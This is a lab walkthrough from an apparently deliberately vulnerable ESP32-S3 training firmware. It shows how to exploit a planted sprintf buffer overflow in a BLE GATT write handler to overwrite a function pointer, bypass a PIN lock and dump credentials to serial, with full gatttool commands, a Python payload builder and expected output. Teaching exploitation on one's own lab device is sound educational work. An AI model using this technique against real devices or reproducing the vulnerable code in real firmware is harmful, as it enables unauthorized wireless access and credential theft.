# L20: BLE GATT Buffer Overflow - Function Pointer Hijack

## Goal
Exploit a buffer overflow in a BLE GATT characteristic write to corrupt a function pointer and hijack execution. Success bypasses the PIN lock, dumps credentials to serial, and flashes the screen BLUE.

## Background

**The exploit:**
1. Overflow a 32-byte buffer to corrupt an adjacent function pointer
2. Overwrite the pointer with address of `ble_config_unlock()`
3. The corrupted pointer is called naturally, hijacking execution

**What you need via reverse engineering:**
- Buffer size (32 bytes) and offset to function pointer
- Address of `ble_config_unlock()` in memory
- Correct byte order (little-endian on ESP32)

**On CoreS3**: The firmware runs a BLE GATT server with a custom service (UUID `12345678-1234-5678-1234-56789abc0001`) containing a writable config characteristic (UUID `12345678-1234-5678-1234-56789abc0002`). The `onWrite` callback has a vulnerable packed struct:

```cpp
class BleConfigCallbacks : public BLECharacteristicCallbacks {
    void onWrite(BLECharacteristic* characteristic) override {
        std::string value = characteristic->getValue();

        struct __attribute__((packed)) {
            char buffer[32];
            void (*configCallback)(void);
        } vuln;

        vuln.configCallback = ble_default_handler;

        // VULNERABLE: sprintf has no bounds checking
        sprintf(vuln.buffer, "%s", value.c_str());

        // Function pointer called naturally after copy
        vuln.configCallback();
    }
};
```

The device advertises as `CoreS3-CAM-XXXX` (derived from MAC address).

**Success feedback:**
- **Screen**: BLUE with "PIN BYPASSED" in white text, and "Device unlocked via BLE" below
- **Audio**: Single tone at C7 (2093 Hz) for 200 ms
- **Serial**: Dumps `admin_pin`, `user_pin`, and `wifi_ssid` in plaintext

**BLE GATT structure:**
- **Service** - Collection of characteristics (e.g., "Device Info")
- **Characteristic** - Data value with UUID (e.g., "Device Name")
- **Descriptor** - Metadata about characteristic

**Scanning for BLE devices:**
- **Linux**: `sudo hcitool lescan` or `bluetoothctl scan on`
- **Raspberry Pi Pico W** running MicroPython (has built-in BLE)
- **Alternative**: Android phone with nRF Connect app
- **iOS**: LightBlue app

**Service enumeration with gatttool:**
- Connect: `gatttool -b MAC_ADDRESS -I` then `connect`
- List services: `primary`
- List characteristics: `characteristics`
- Read: `char-read-hnd 0x0010`
- Write: `char-write-req 0x0010 4142434445`

## Lab Walkthrough

### Step 1: Find Target Function Address

Use `nm` to locate `ble_config_unlock` in the firmware ELF. This address overwrites the `configCallback` pointer (which normally points to `ble_default_handler`).


**Note:** `xtensa-esp32s3-elf-*` tools are Xtensa cross-tools for ESP32-S3, not standard Linux binaries. See the main [labs README](../LABS.md) for installation instructions.

```bash
# Find ble_config_unlock in the symbol table
xtensa-esp32s3-elf-nm .pio/build/M5CoreS3/firmware.elf | grep ble_config_unlock

# Expected output (address will vary per build):
# 4200d720 T ble_config_unlock

# Alternative: use objdump for more detail
xtensa-esp32s3-elf-objdump -t .pio/build/M5CoreS3/firmware.elf | grep ble_config_unlock

# Expected output:
# 4200d720 g     F .flash.text    00000096 ble_config_unlock
```

Note the address (e.g., `0x4200D720`). `T` means global function in the text section (flash memory `0x4200xxxx` on ESP32-S3).

### Step 2: Scan for BLE Devices

Discover the CoreS3 advertising as `CoreS3-CAM-XXXX` and note its MAC address.

```bash
# Scan for BLE devices using hcitool
sudo hcitool lescan

# Expected output:
# LE Scan ...
# 24:0A:C4:XX:XX:XX CoreS3-CAM-XXXX

# Alternative: use bluetoothctl
bluetoothctl
[bluetooth]# scan on
# [NEW] Device 24:0A:C4:XX:XX:XX CoreS3-CAM-XXXX
[bluetooth]# scan off
```

### Step 3: Enumerate GATT Services and Find the Config Characteristic

Connect and find the writable config characteristic handle. The characteristic supports READ, WRITE, and NOTIFY properties.

```bash
# Connect and list all services
gatttool -b 24:0A:C4:XX:XX:XX -I
[24:0A:C4:XX:XX:XX][LE]> connect
Connection successful
[24:0A:C4:XX:XX:XX][LE]> primary
# attr handle: 0x0001, end grp handle: 0x0005 uuid: 00001801-0000-1000-8000-00805f9b34fb
# attr handle: 0x0014, end grp handle: 0x001a uuid: 12345678-1234-5678-1234-56789abc0001

# List characteristics in the custom service
[24:0A:C4:XX:XX:XX][LE]> characteristics
# handle: 0x0015, char properties: 0x1a, char value handle: 0x0016, uuid: 12345678-1234-5678-1234-56789abc0002

# Properties 0x1a = READ (0x02) | WRITE (0x08) | NOTIFY (0x10)
```

Serial output when a BLE client connects:
```
[BLE] Device connected
[BLE] Pairing keys exchanged (capture BLE traffic to extract)
```

Note the characteristic value handle (e.g., `0x0016`).

### Step 4: Craft Exploit Payload

Build 32 bytes padding + 4-byte target address (little-endian) = 36 bytes total. The `sprintf` copies the GATT write value into the 32-byte buffer without bounds checking, and `__attribute__((packed))` guarantees the function pointer sits at exactly offset 32.

Note: `sprintf` stops at null bytes (`0x00`), so this exploit works because the null byte in the address is near the end. If your address contains a null byte before the last position, you would need an alternative approach.

```python
import struct

buffer_size = 32
target_addr = 0x4200D720  # ble_config_unlock address (from Step 1)

# Padding + address (little-endian)
payload = b'A' * buffer_size + struct.pack('<I', target_addr)
hex_payload = payload.hex()
print(f"Payload length: {len(payload)} bytes")
print(f"Hex payload for gatttool: {hex_payload}")

# Output:
# Payload length: 36 bytes
# Hex payload for gatttool: 414141414141414141414141414141414141414141414141414141414141414120d70042
```

### Step 5: Send Exploit via BLE GATT Write

Write the 36-byte payload to the config characteristic. The `onWrite` handler copies via `sprintf`, overflows the buffer, corrupts the function pointer, then calls it - executing `ble_config_unlock()`.

```bash
# Write exploit payload to config characteristic
gatttool -b 24:0A:C4:XX:XX:XX --char-write-req \
  --handle=0x0016 \
  --value=$(python3 -c "print('41'*32 + '20d70042')")

# Expected output:
# Characteristic value was written successfully

# Alternative: using interactive mode
gatttool -b 24:0A:C4:XX:XX:XX -I
[24:0A:C4:XX:XX:XX][LE]> connect
Connection successful
[24:0A:C4:XX:XX:XX][LE]> char-write-req 0x0016 414141414141414141414141414141414141414141414141414141414141414120d70042
# Characteristic value was written successfully
```

### Step 6: Verify Exploitation

**What happens on success:**

1. **Screen flashes BLUE** with "PIN BYPASSED" in white text, and "Device unlocked via BLE" below
2. **Speaker plays** a single tone at 2093 Hz (C7) for 200 ms
3. **PIN lock is bypassed** - device jumps directly to camera view (skipping the PIN entry screen)
4. **Admin mode is unlocked** on the serial console
5. **Serial output** dumps credentials (PIN values are randomly generated per device):

```
[BLE] Device connected
[LED] Camera view - ON
admin_pin=YYYYYY
user_pin=XXXXXX
[BLE] Config write processed, len=36 bytes
```

**Note:** The device may crash and reboot after the exploit if the LVGL display update races with the BLE task context (FreeRTOS assertion failure). The credentials are always dumped to serial before any crash. If the device does crash, simply reconnect after reboot.

**Verify via serial:**

After the exploit (or after reboot if it crashed), verify admin access:

```bash
cores3-cam> login <admin_pin_from_serial_output>
Admin mode unlocked.

cores3-cam> whoami
# Expected: admin

cores3-cam> nvs-dump
# Now accessible - shows all stored secrets
```

**Verify via HTTP:**

```bash
curl -s http://192.168.4.1/status
# Look for: "admin_mode":true
```

**If nothing happens:**
- Verify BLE is initialized (device should be advertising as `CoreS3-CAM-XXXX`)
- Check the target address matches your specific build (re-run `nm` on your ELF)
- Verify byte order is little-endian (LSB first)
- Make sure the handle is correct (re-enumerate characteristics if needed)

## Hints

**Hint 1: Finding the address**

Use `xtensa-esp32s3-elf-nm` to find the exact address:
```bash
xtensa-esp32s3-elf-nm .pio/build/M5CoreS3/firmware.elf | grep ble_config_unlock
```

You can also find it in the `diag 19` serial output:
```
ble_config_unlock address: 0x4200D720
```


**Hint 2: Address format**

ESP32-S3 (Xtensa LX7) is little-endian. Address `0x4200D720` becomes hex string `20d70042` for the gatttool `--value` parameter. Send LSB first.


**Hint 3: Buffer size and overflow mechanics**

The vulnerable buffer is exactly 32 bytes in a `__attribute__((packed))` struct. The function pointer starts at byte offset 32. The overflow happens via `sprintf(vuln.buffer, "%s", value.c_str())` which copies the entire GATT write value without length checking. Total payload: 36 bytes (32 padding + 4 address).


## Impact

- **Wireless code execution**: Triggered over BLE with no physical access required, only radio proximity (10-100 meters)
- **No authentication required**: The GATT characteristic accepts writes from any connected BLE client without pairing
- **Silent exploitation**: The overflow happens inside `onWrite` with no error response - GATT Write Response indicates success regardless
- **Arbitrary function redirection**: Attacker controls which function the corrupted pointer calls
- **Shared radio attack surface**: ESP32-S3 BLE shares the 2.4 GHz antenna with WiFi, so BLE is always accessible when WiFi is active

## Success Criteria

- [ ] Found `ble_config_unlock()` address via nm/objdump (in the `0x4200xxxx` range)
- [ ] Scanned for BLE device and found `CoreS3-CAM-XXXX`
- [ ] Connected and enumerated GATT services, found config characteristic handle
- [ ] Crafted payload with 32 bytes padding + little-endian address (36 bytes total)
- [ ] Sent payload via BLE GATT write to config characteristic
- [ ] **Screen flashed BLUE with "PIN BYPASSED"**
- [ ] **Heard tone at 2093 Hz (C7)**
- [ ] **Serial output showed `admin_pin`, `user_pin`, and `wifi_ssid` in plaintext**
- [ ] **PIN lock bypassed - device jumped to camera view without PIN entry**
- [ ] **Admin mode unlocked (`whoami` shows `admin`)**

## References

- [Bluetooth Core Specification](https://www.bluetooth.com/specifications/specs/core-specification/)
- [ESP32-S3 BLE Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/bluetooth/bt_le.html)
- [CWE-120: Buffer Copy without Checking Size of Input](https://cwe.mitre.org/data/definitions/120.html)
- [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- [BlueBorne Vulnerabilities (Armis)](https://www.armis.com/research/blueborne/)
- [ESP32-S3 Technical Reference Manual](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
